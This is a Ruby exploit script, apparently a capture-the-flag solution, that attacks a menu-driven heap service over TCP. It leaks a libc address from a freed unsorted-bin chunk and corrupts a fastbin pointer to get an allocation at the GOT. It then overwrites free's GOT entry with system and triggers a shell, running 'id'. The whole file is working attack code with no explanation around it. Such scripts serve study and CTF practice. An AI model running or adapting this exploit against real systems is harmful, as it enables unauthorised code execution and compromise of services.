#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'pry'
require 'socket'
require 'heapinfo'
def p64(a)
  [a].pack('Q*')
end

def u64(a)
  a.ljust(8, "\x00").unpack('Q*')[0]
end
# *- end of default code

$HOST = ''
$PORT = 12_345
$local = false
($HOST = '0'; $local = true) if ARGV.empty?
$z = z = TCPSocket.new $HOST, $PORT
$h = h = heapinfo('fastbin')
# ==================== Exploit Start ==================== #
z.gets "puts\n" # welcome message
$pt = '> '
def new(idx, size, data)
  z = $z
  z.gets $pt
  z.puts "1 #{idx} #{size}"
  raise if data.include? "\n"

  z.write data + "\n"
end

def free(idx)
  $z.gets $pt
  $z.puts "2 #{idx}"
end

def _puts(idx)
  $z.gets $pt
  $z.puts "3 #{idx}"
  $z.gets[0..-2]
end
new(0, 136, 'small') # smallbin size
new(1, 88, 'fast') # prevent smallbin merge with top_chunk
free(0)
h.layouts :unsorted_bin
unsorted = u64(_puts(0))
# p "offset = 0x%x" % (unsorted - h.libc.base)
libc_base = unsorted - 0x3be7b8
h.debug { raise unless libc_base === h.libc.base }
# puts h.dump_chunks :heap, 0x100
free(1)
h.layouts :fastbin
# h.pry
got_head = 0x601000
new(0, 136, 'A' * 136 + p64(0x60) + p64(got_head - 6))
sleep(0.1)
h.layouts :fastbin
new(1, 88, 'A')

# malloc at GOT, write free_got to system
new(1, 88, "sh\x00".ljust(14, "\x00") + p64(libc_base + 0x46640))
z.gets $pt
z.puts '2 1' # free(ptr) -> system(ptr)
sleep(0.1)
z.puts 'id'
p z.gets
